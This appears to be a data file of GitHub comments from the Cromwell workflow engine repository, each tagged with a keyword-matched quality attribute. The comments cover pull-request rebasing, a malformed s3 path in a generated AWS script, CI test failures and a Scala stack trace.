https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799:527,Testability,test,test,527,"Hi @aednichols @cjllanwarne ; I'm really sorry for long reply. I'm so overworked that it took a month for me to get this done.; I've rebased this pull request, as well as two others (https://github.com/broadinstitute/cromwell/pull/6072 and https://github.com/broadinstitute/cromwell/pull/6081) at the develop branch.; Unfortunately, I couldn't find a way to resolve all comments. I did add tests to the CallCacheDiffActorSpec in this PR https://github.com/broadinstitute/cromwell/pull/6081. But I didn't find a way to properly test this PR https://github.com/broadinstitute/cromwell/pull/6072 nor to check how it will affect performance.; Please let me know if this PRs are okay for you in their current state. I can make some minor changes if required. But If they require a lot of time than I'm afraid I won't be able to maintain them and it's better to close them. I promise this time I'll respond to your comments faster :); Huge thanks for your invitation, although it already expired. I would love to continue to contribute to Cromwell. But right now it's almost impossible for me to find enough time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-763966799
https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-765907424:111,Availability,error,error,111,"@aednichols Thanks for the new invitation. I did accept it, but when I try to push a branch to this repo I get error 403.; Am I doing something wrong?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6104#issuecomment-765907424
https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857:436,Availability,echo,echo,436,"Hi,. This looks like a bug in the generation of the script. Any chance you can; share the WDL file with me?. On Mon, Nov 30, 2020 at 7:35 AM henriqueribeiro <notifications@github.com>; wrote:. > I'm running gatk-sv workflows with AWS backend and I'm facing some issues; > on scatter tasks. It seems that for some of the tasks, the; > reconfigured-script is bad constructed. Below is an excerpt from the script:; >; > #!/bin/bash; >; > {echo '*** LOCALIZING INPUTS ***'if [ ! -d /tmp/scratch ]; then mkdir /tmp/scratch && chmod 777 /tmp/scratch; ficd /tmp/scratch; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-48/SR00c.NA20802.txt.gz.tbi /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-48/SR00c.NA20802.txt.gz.tbi; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-31/SR00c.NA19661.txt.gz /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-31/SR00c.NA19661.txt.gz; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-32/SR00c.NA19678.txt.gz.tbi /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/ca",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857
https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857:15462,Deployability,pipeline,pipeline,15462,"a818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-20/SR00c.NA19001.txt.gz /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-20/SR00c.NA19001.txt.gz; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-43/SR00c.NA20509.txt.gz /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-43/SR00c.NA20509.txt.gz; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-32/SR00c.NA19678.txt.gz /tmp/scratch/s3:/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-32/SR00c.NA19678.txt.gz; >; > {code}; >; > (sorry for the long log); > As you can see, in the last line, the output path of s3 copy is malformed,; > there is an 's3:/' lost there. This causes the whole pipeline to fail. I; > already tried several times and sometimes it happens, sometimes don't. Also; > when it happens, it's not always in the same shard. Do you have any ideia; > why this is happening?; > Thanks in advance; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6106>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ELH2MI44ZN2D3LYJZTSSOGSVANCNFSM4UHQIFCA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857
https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857:15323,Testability,log,log,15323,"a818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-20/SR00c.NA19001.txt.gz /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-20/SR00c.NA19001.txt.gz; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-43/SR00c.NA20509.txt.gz /tmp/scratch/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-43/SR00c.NA20509.txt.gz; > /usr/local/aws-cli/v2/current/bin/aws s3 cp --no-progress s3://aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-32/SR00c.NA19678.txt.gz /tmp/scratch/s3:/aaaaaaa-gwf-core/cromwell-execution/Module00c/ab433d98-4b83-4bc5-bb21-ec8f057d81af/call-EvidenceMerging/EvidenceMerging/f4fa818c-5f46-4891-a26a-0f0368fef639/call-SetSampleIdSR/shard-32/SR00c.NA19678.txt.gz; >; > {code}; >; > (sorry for the long log); > As you can see, in the last line, the output path of s3 copy is malformed,; > there is an 's3:/' lost there. This causes the whole pipeline to fail. I; > already tried several times and sometimes it happens, sometimes don't. Also; > when it happens, it's not always in the same shard. Do you have any ideia; > why this is happening?; > Thanks in advance; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6106>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ELH2MI44ZN2D3LYJZTSSOGSVANCNFSM4UHQIFCA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6106#issuecomment-738953857
https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738344034:108,Modifiability,refactor,refactor,108,Reviewer note: I recommend reviewing commit-by-commit so that the actual bug fix stands out from the larger refactor.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738344034
https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738392923:92,Modifiability,extend,extends,92,@cjllanwarne just personal preference. I like how these constructs read. ```; class MyClass extends TypeOfThingClassDoes { }; ```; compared to; ```; import UtilityObject. // many intervening lines of code. class MyClass { }; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738392923
https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738881080:306,Modifiability,inherit,inheritance,306,"@aednichols based purely on your last comment it's quite possible you're seeing the difference in the early days between the more FP-focus in one camp and more OOP-focus in the other. . I've seen Odersky et al talk about how they see classes & objects as best providing namespaced modules a la ML, whereas inheritance is obv a key component of mainstream OOP constructs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738881080
https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511:25,Availability,error,errors,25,Merging despite AWS test errors because:; * The AWS backend test suite has known issues relating to dockerhub pull limits; * We are not running AWS in Terra production; * The changes here are **extremely** unlikely to have had any impact on the AWS backend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511
https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511:20,Testability,test,test,20,Merging despite AWS test errors because:; * The AWS backend test suite has known issues relating to dockerhub pull limits; * We are not running AWS in Terra production; * The changes here are **extremely** unlikely to have had any impact on the AWS backend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511
https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511:60,Testability,test,test,60,Merging despite AWS test errors because:; * The AWS backend test suite has known issues relating to dockerhub pull limits; * We are not running AWS in Terra production; * The changes here are **extremely** unlikely to have had any impact on the AWS backend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6123#issuecomment-740827511
https://github.com/broadinstitute/cromwell/pull/6128#issuecomment-741916669:28,Testability,test,test,28,Merging despite failing AWS test because:; 1. This change is extremely unlikely to have impacted AWS; 2. The AWS backend is experiencing a known issue with dockerhub pull limits; 3. The AWS backend is not a feature of Terra production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6128#issuecomment-741916669
https://github.com/broadinstitute/cromwell/pull/6132#issuecomment-745136646:333,Testability,log,logs,333,Thanks! . For the future reader who finds this issue I was able to circumvent the 300 bytes limit (or the future 3000 bytes limit) by using the [following lines](https://github.com/biowdl/germline-DNA/blob/f9ef59c661c95faa5ec3d2a7c6762471c1a6f06c/.github/workflows/ci.yml#L66) in the github actions ci yml. Using pytest-workflow all logs are generated in /tmp and can be read in full this way. This may come in useful when even the 3000 bytes are not enough.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6132#issuecomment-745136646
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:214,Availability,down,download,214,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1235,Modifiability,Enhance,EnhancedFailureResponseOrT,1235,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1343,Modifiability,Enhance,EnhancedFutureHttpResponse,1343,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1085,Safety,unsafe,unsafeToFuture,1085,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1198,Safety,timeout,timeout,1198,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1263,Safety,timeout,timeout,1263,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:690,Security,validat,validateMetadata,690,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:777,Security,validat,validateMetadata,777,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:864,Security,validat,validateMetadata,864,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:955,Security,validat,validateMetadata,955,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1046,Security,validat,validateMetadata,1046,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690
